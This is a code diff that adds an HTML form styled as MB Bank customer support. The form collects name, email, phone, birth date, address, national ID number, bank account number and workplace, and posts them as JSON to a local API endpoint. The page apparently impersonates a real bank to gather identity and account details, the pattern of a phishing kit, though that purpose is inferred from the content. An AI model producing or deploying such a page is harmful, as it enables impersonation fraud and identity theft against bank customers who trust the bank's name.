@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hỗ trợ khách hàng MB Bank</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2" sizes="16x16 32x32">
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
+  <style>
+    body {
+      background-image: url('/bg.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+    }
+  </style>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+  <div class="bg-white p-10 rounded-lg shadow-md w-full max-w-2xl">
+    <h2 class="text-4xl font-bold mb-8 text-center">Thông tin cá nhân</h2>
+
+    <div class="space-y-6">
+      <input id="name" class="w-full border p-4 rounded text-xl" type="text" placeholder="Họ tên *">
+      <input id="email" class="w-full border p-4 rounded text-xl" type="email" placeholder="Email *">
+      <input id="phone" class="w-full border p-4 rounded text-xl" type="tel" placeholder="SĐT">
+      <input id="dob" class="w-full border p-4 rounded text-xl" type="date">
+      <input id="address" class="w-full border p-4 rounded text-xl" type="text" placeholder="Địa chỉ">
+      <input id="idNumber" class="w-full border p-4 rounded text-xl" type="text" placeholder="Số CCCD">
+      <input id="bankAccount" class="w-full border p-4 rounded text-xl" type="text" placeholder="STK Ngân hàng">
+      <input id="workplace" class="w-full border p-4 rounded text-xl" type="text" placeholder="Nơi làm việc">
+
+      <button onclick="submitForm()" class="w-full bg-blue-500 text-white p-4 rounded text-xl hover:bg-blue-600">Gửi thông tin</button>
+    </div>
+  </div>
+
+  <script>
+    async function submitForm() {
+        const formElements = {
+            name: document.getElementById('name'),
+            email: document.getElementById('email'),
+            phone: document.getElementById('phone'),
+            dob: document.getElementById('dob'),
+            address: document.getElementById('address'),
+            idNumber: document.getElementById('idNumber'),
+            bankAccount: document.getElementById('bankAccount'),
+            workplace: document.getElementById('workplace'),
+        };
+
+        const formData = {
+            name: formElements.name.value,
+            email: formElements.email.value,
+            phone: formElements.phone.value,
+            dob: formElements.dob.value,
+            address: formElements.address.value,
+            idNumber: formElements.idNumber.value,
+            bankAccount: formElements.bankAccount.value,
+            workplace: formElements.workplace.value,
+            timestamp: new Date().toISOString(),
+        };
+
+        if (!formData.name || !formData.email) {
+            alert('Vui lòng điền đầy đủ thông tin.');
+            return;
+        }
+
+        function isValidPhoneNumber(phone) {
+            return /^\d{10}$/.test(phone);
+        }
+
+        function isValidIDNumber(idNumber) {
+            return /^[a-zA-Z0-9]{9,12}$/.test(idNumber);
+        }
+
+        if (formData.phone && !isValidPhoneNumber(formData.phone)) {
+            alert('Số điện thoại phải có 10 chữ số.');
+            return;
+        }
+
+        if (formData.idNumber && !isValidIDNumber(formData.idNumber)) {
+            alert('Số CCCD phải có 9-12 ký tự.');
+            return;
+        }
+
+        try {
+            const response = await fetch('http://localhost:3000/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData),
+            });
+
+            const result = await response.json();
+
+            if (result.status === 'success') {
+                alert('Gửi thông tin thành công!');
+                Object.values(formElements).forEach(input => input.value = '');
+            } else {
+                alert('Lỗi khi gửi thông tin: ' + result.message);
+            }
+        } catch (error) {
+            console.error('Chi tiết lỗi:', error);
+            alert('Lỗi khi gửi thông tin. Vui lòng kiểm tra console (F12).');
+        }
+    }
+  </script>
+</body>
+</html>
